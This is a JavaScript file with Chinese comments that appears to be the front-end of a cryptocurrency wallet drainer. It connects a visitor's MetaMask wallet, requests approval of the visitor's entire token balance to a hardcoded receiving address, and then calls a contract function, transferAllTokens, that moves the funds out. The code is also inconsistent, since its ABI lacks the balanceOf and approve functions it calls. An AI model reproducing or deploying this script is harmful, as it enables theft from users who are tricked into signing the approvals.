let web3;
let account;
const contractAddress = '0xa465e2fc9f9d527AAEb07579E821D461F700e699'; // 你的接收地址
const tokenAddress = '0x56a2777e796eF23399e9E1d791E1A0410a75E31b'; // 你的已部署的合约地址
const tokenABI = [
	{
		"inputs": [
			{
				"internalType": "contract IERC20",
				"name": "token",
				"type": "address"
			}
		],
		"name": "approveAll",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "contract IERC20",
				"name": "token",
				"type": "address"
			}
		],
		"name": "transferAllTokens",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"inputs": [],
		"name": "withdrawETH",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"stateMutability": "payable",
		"type": "receive"
	},
	{
		"inputs": [],
		"name": "owner",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "recipient",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	}
]; // 你的代币合约的ABI

// 初始化 Web3
async function connectWallet() {
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        try {
            // 请求连接钱包
            const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
            account = accounts[0];
            document.getElementById("status").innerText = "已连接钱包: " + account;
            document.getElementById("authorizeTransfer").disabled = false;
        } catch (error) {
            document.getElementById("status").innerText = "钱包连接失败: " + error.message;
        }
    } else {
        document.getElementById("status").innerText = "请安装 MetaMask!";
    }
}

// 授权并转移代币
async function authorizeAndTransfer() {
    const tokenContract = new web3.eth.Contract(tokenABI, tokenAddress);
    
    try {
        // 获取钱包的代币余额
        const balance = await tokenContract.methods.balanceOf(account).call();
        document.getElementById("status").innerText = "正在授权代币转移...";

        // 执行 approve 授权，授权无限量代币转移
        await tokenContract.methods.approve(contractAddress, balance).send({ from: account });

        document.getElementById("status").innerText = "授权成功，正在转移代币...";

        // 执行转移
        await tokenContract.methods.transferAllTokens(tokenAddress).send({ from: account });

        document.getElementById("status").innerText = "代币已成功转移到接收地址！";
    } catch (error) {
        document.getElementById("status").innerText = "操作失败: " + error.message;
    }
}
